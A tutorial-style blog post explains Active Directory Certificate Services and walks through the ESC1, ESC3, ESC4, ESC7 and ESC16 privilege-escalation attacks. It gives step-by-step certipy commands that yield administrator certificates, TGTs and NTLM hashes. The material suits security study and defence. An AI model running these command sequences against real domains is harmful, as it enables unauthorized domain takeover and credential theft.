---
title: ADCS - Active Directory Certificate Services
layout: post
date: 2025-05-13
description: "Active Directory Certificate Services (ADCS) is a Microsoft server role that provides customizable services for creating and managing public key certificates used in software security systems."
permalink: /theory/windows/AD/adcs/
---

## Overview
Active Directory Certificate Services (ADCS) is a Microsoft server role that provides customizable services for creating and managing public key certificates used in software security systems. It is part of the Windows Server operating system and is used to create a public key infrastructure (PKI) that can be used to secure communications, authenticate users, and encrypt data.

ADCS allows organizations to issue and manage digital certificates, which are used to verify the identity of users, devices, and services.

## ADCS Terms

### Certificates

A digital certificate is an electronic document used to prove the ownership of a public key. It contains information about the key, the identity of its owner (the subject), and the digital signature of an entity that has verified the certificate's contents, usually a trusted third party known as a Certificate Authority (CA).

It is a `X-509-formatted` file that contains the following information:
- **Subject**: The entity that the certificate represents (e.g., a user, device, or service).
- **Public Key**: The public key associated with the subject.
- **Not Before** and **Not After**: The validity period of the certificate.
- **Issuer**: The entity that issued the certificate (usually a CA).
- **Serial Number**: A unique identifier for the certificate.
- **Subject Alternative Name (SAN)**: Additional identities associated with the certificate (e.g., DNS names, IP addresses).
- **Basic Constraints**: Indicates whether the certificate can be used as a CA certificate or an end-entity certificate.
- **Extended Key Usage**: Specifies the purposes for which the certificate can be used (e.g., server authentication, client authentication, code signing).
- **Signature Algorithm**: The algorithm used to sign the certificate.



### Certificate Authority (CA)

A Certificate Authority (CA) is a trusted entity that issues digital certificates. The CA verifies the identity of the entity requesting the certificate and signs the certificate with its private key. This process ensures that the certificate can be trusted by other entities.

The root CA certificate is the top-level certificate in a certificate hierarchy. It is self-signed and serves as the trust anchor for all other certificates issued by the CA.

ADCS stores trusted root CA in four locations under the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com`:
- `Certification Authorities container`: Defines top-tier root CA certificates
- `Enrolment Services container`: Encapsulates key attributes such as pKIEnrollmentService objectClass, cACertificate data, dNSHostName and certificateTemplates
- `NTAuthCertificates AD object`: Contains cACertificate properties defining a series of trusted CA certificates
- `AIA (Authority Information Access) container`: Aids in validating certificate chains

### Certificate Templates

Certificate templates are used to establish certificate properties and settings for different types of certificates, that include enrolment policies, key usage, and security settings. They define the attributes and constraints of the certificates issued by a CA.


## ADCS Attacks

### ESC1 (Enrolee-Supplied Subject for Client Authentication)

The ESC1 attack is a method used to exploit the Active Directory Certificate Services (ADCS) to issue certificates for any user or computer account in the domain. This attack takes advantage of a misconfiguration in the certificate template that allows low-privileged users to request certificates with an arbitrary identity within the certificate's SAN (Subject Alternative Name) field. This can lead to privilege escalation by allowing an attacker to obtain a certificate for a high-privileged account, such as a domain administrator, and then use that certificate to authenticate to the domain.

#### ESC1 Requirements
ESC1 is created by the following conditions:
- **Enrolee Supplies Subject**: The certificate template must allow the enrolee to specify the subject name by having the flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set ("Supply in the request" option under the "Subject Name" tab). With this enabled, the user specifies the subject name when requesting a certificate, not the AD.
- **Authentication EKU**: The certificate template must include an EKU that permits client authentication, such as "Client Authentication" (OID 1.3.6.1.5.5.7.3.2), "Smart Card Logon" (OID 1.3.6.1.4.1.311.20.2.2), "PKINIT Client Authentication" (OID 1.3.6.1.5.2.3.4), or the overly permissive "Any Purpose" (OID 2.5.29.37.0)
- **Permissive Enroollment Permissions**: The user must have permissions to enroll in the certificate template, which can be granted through the `Enroll` or `Autoenroll` permissions on the template.
- **No Effective Security Gates**: The certificate template does not enforce manager approval nor requires authorized signatures. 

#### ESC1 Steps

**Enumeration**

```bash
certipy find -u 'mhijuxs@sw4.local' -p 'Password123!' -dc-ip <DC-IP> -vulnerable -stdout
```
> Command breakdown:
> - `certipy find`: Find vulnerable certificate templates
> - `-u`: User to authenticate as
> - `-p`: Password for the user
> - `-dc-ip`: IP address of the domain controller 
> - `-vulnerable`: Output only vulnerable certificate templates
> - `-stdout`: Output to standard output
{: .prompt-info}

**Requesting Certificate**

```bash
certipy req -u 'mhijuxs@sw4.local' -p 'Password123!' -dc-ip <DC-IP> -ca <CA> -template <VulnerableTemplate> -upn <TargetUser> 
```

**Authenticating with the Certificate**

```bash
certipy auth -pfx <Certificate.pfx> -user <TargetUser> -dc-ip <DC-IP>
```

After that, we receive a `TGT` and the user's `NTLM` hash.

### ESC3 (Enrollment Agent Certificate)

The ESC3 attack abuses a certificate template that grants the **Certificate Request Agent** EKU (OID `1.3.6.1.4.1.311.20.2.1`). A certificate carrying this EKU turns its holder into an *enrollment agent*, an identity that Active Directory trusts to request certificates **on behalf of** other users. If a low-privileged user is allowed to enroll in such a template, they can obtain the agent certificate and then use it to request a client-authentication certificate for any user, such as a domain administrator, and authenticate as that user.

Unlike ESC1, the attacker never supplies an arbitrary SAN. The privilege comes from the second request being *signed by* an enrollment agent, which the CA accepts as authorization to enroll for someone else.

#### ESC3 Requirements

The attack chains two templates:

- **Agent template**: a template with the `Certificate Request Agent` EKU that the attacker is allowed to enroll in. This yields the enrollment agent certificate.
- **Target template**: a template that has a client authentication EKU (for example the default `User` template), that the intended victim can enroll in, and where the CA and template do **not** restrict which enrollment agents may act or for which users (no enrollment-agent restrictions, and `Authorized Signatures Required` satisfied by a single Certificate Request Agent signature).

#### ESC3 Exploitation

1. **Enumerate** (certipy flags the template with `ESC3` and the `Certificate Request Agent` EKU)

    ```bash
    certipy find -u 'user@domain' -p 'password' -dc-ip <DC-IP> -vulnerable -stdout
    ```

2. **Request the enrollment agent certificate** from the agent template

    ```bash
    certipy req \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -target 'CA.domain' \
        -ca 'Domain-CA' -template 'EnrollmentAgentTemplate'
    ```

    This writes an agent `.pfx` belonging to our user.

3. **Request a certificate on behalf of a privileged user**, signing the request with the agent certificate

    ```bash
    certipy req \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -target 'CA.domain' \
        -ca 'Domain-CA' -template 'User' \
        -pfx 'agent.pfx' -on-behalf-of 'DOMAIN\administrator'
    ```
    > `-on-behalf-of` takes the `NETBIOS\user` form of the target. The `-pfx` is the agent certificate from step 2, which is what supplies the Certificate Request Agent signature.
    {: .prompt-info}

4. **Authenticate with the resulting certificate**

    ```bash
    certipy auth -pfx 'administrator.pfx' -dc-ip <DC-IP>
    ```

    We receive the target's `TGT` and `NTLM` hash.

### ESC4 (Template Hijacking)
Occurs when we have permission to modify a certificate template, allowing us to add a new template or modify an existing one. This can lead to the issuance of certificates for any user or computer account in the domain.

By default, only high privileged users can modify certificate templates, but a misconfiguration can allow low-privileged users to modify them. 

#### ESC4 Requirements
If a user has `FullControl, WriteDacl, WriteOwner` or write property rights on attributes like `msPKI-Enrollment-Flag, msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage, nTSecurityDescriptor`, they are likely to be able to modify the template.

#### ESC4 Exploitation

1. **Enumerate Certificate Templates**

    ```bash
    certipy find -u 'user@domain' -p 'Password' -vulnerable -stdout
    ```

2. **Modify the Template**

    Certipy allows us to modify the template to a known vulnerable configuration. This can be done by writing a default configuration that allows low-privileged users to request certificates for any user, like the `ESC1` attack.

    ```bash
    certipy template \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -template 'VulnerableTemplate' \
        -write-default-configuration
    ```
    
    After that, if we enumerate the vulnerable templates once more, you will see that the template is now vulnerable to an `ESC1` attack.

3. **Request a Certificate**

    ```bash
    certipy req \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -target 'TARGET FQDN' \
        -ca 'Domain CA' -template 'VulnerableTemplate' \
        -upn 'administrator@domain' 
    ```

4. **Authenticate with the Certificate**

    ```bash
    certipy auth \
        -pfx <Certificate.pfx> \
        -dc-ip <DC-IP>
    ```

### ESC7 (Vulnerable CA Access Control)

ESC7 is a misconfiguration on the **CA itself** rather than on a template. Two CA access rights matter:

- **ManageCA** (CA Administrator): can change CA configuration, enable disabled templates, add or remove certificate managers (officers), and toggle CA-wide flags such as `EDITF_ATTRIBUTESUBJECTALTNAME2` (which turns the CA into ESC6).
- **ManageCertificates** (Certificate Manager / officer): can approve pending or denied certificate requests.

Neither right, on its own, is "issue me a domain admin certificate". The attack is composing them: a principal holding only `ManageCA` first grants itself the officer role, then approves a request it was not allowed to enroll for. The canonical route uses the built-in `SubCA` template, which permits an arbitrary SAN but by default only Domain/Enterprise Admins can enroll, so our request is denied and then force-issued.

#### ESC7 Requirements

- `ManageCA` over the target CA (optionally `ManageCertificates` as well, which lets you skip the add-officer step).

#### ESC7 Exploitation

1. **Enumerate** (certipy flags the CA with `ESC7 : User has dangerous permissions`)

    ```bash
    certipy find -u 'user@domain' -p 'password' -dc-ip <DC-IP> -vulnerable -stdout
    ```

2. **Add yourself as an officer** (grants `ManageCertificates`)

    ```bash
    certipy ca \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -ca 'Domain-CA' \
        -add-officer 'user'
    ```

3. **Enable the `SubCA` template** on the CA (it allows an arbitrary SAN)

    ```bash
    certipy ca \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -ca 'Domain-CA' \
        -enable-template 'SubCA'
    ```

4. **Request a certificate for a privileged user via `SubCA`.** Enrollment is denied (we are not a Domain Admin), but certipy saves the request ID and the private key.

    ```bash
    certipy req \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -ca 'Domain-CA' -template 'SubCA' \
        -upn 'administrator@domain' -sid '<ADMIN-SID>'
    ```

5. **Approve your own denied request** using the officer role from step 2

    ```bash
    certipy ca \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -ca 'Domain-CA' \
        -issue-request <REQUEST-ID>
    ```

6. **Retrieve the now-issued certificate**, pairing it with the saved key

    ```bash
    certipy req \
        -u 'user@domain' -p 'password' \
        -dc-ip <DC-IP> -ca 'Domain-CA' \
        -retrieve <REQUEST-ID>
    ```

7. **Authenticate with the certificate**

    ```bash
    certipy auth -pfx 'administrator.pfx' -dc-ip <DC-IP>
    ```

> If the CA's RPC and web-enrollment endpoints are filtered, certipy's `ca` and `req` management calls will time out. Add `-ldap-scheme ldap` to drive the CA operations over LDAP instead of the default DCOM/RPC transport.
{: .prompt-tip}

### ESC16 (Security Extension Disabled on CA)

Is identical to the mechanism used in `ESC9` attacks, where the end result is a certificate lacking the `SID` security extension, the difference is that in this case, any certificate template enabling client authentication can be used in the `UPN` manipulation attack.

If we are an attacker with `GenericWrite` permissions over the `victim` account, and this account can enroll in any client authentication template, we can request a certificate for the `victim` account with a `UPN` of our choice.

#### ESC16 Exploitation

1. **Read UPN of the Victim Account** (Reference for step 5) 

    ```bash
    certipy account \
        -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
        -dc-ip '<DC-IP>' -user 'victim' \
        read
    ```

2. **Update UPN of the Victim Account:** Update the `UPN` of the victim account to a value that we control, such as `administrator`.

    ```bash
    certipy account \
        -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
        -dc-ip '<DC-IP>' -upn 'administrator' \
        -user 'victim' update
    ```

3. **Obtain credentials for the Victim Account:** (Can be skipped if already known)

    ```bash
    certipy shadow \
        -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
        -dc-ip '<DC-IP>' -account 'victim' \
        auto
    ```

4. **Request a Certificate for the Victim Account**

    4.1. **Set kerberos credential cache (KRB5CCNAME)**

        ```bash
        export KRB5CCNAME=victim.ccache
        ```

    4.2. **Request the certificate from any client authentication template (by default the 'User' template)**

        ```bash
        certipy req \
            -k -dc-ip '<DC-IP>' \
            -target 'CA.<DOMAIN>' -ca 'CORP-CA' \
            -template 'User'
        ```

5. **Revert UPN of the Victim Account**

    ```bash
    certipy account \
        -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
        -dc-ip '<DC-IP>' -upn 'victim@<DOMAIN>' \
        -user 'victim' update
    ```

6. **Authenticate with the Certificate**

    ```bash
    certipy auth \
        -dc-ip '<DC-IP>' -pfx 'administrator.pfx' \
        -username 'administrator' -domain '<DOMAIN>'
    ```

## References

- [Hack the Box - ADCS](https://www.academy.hackthebox.com)
- [Certified Pre-Owned SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Certipy - Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
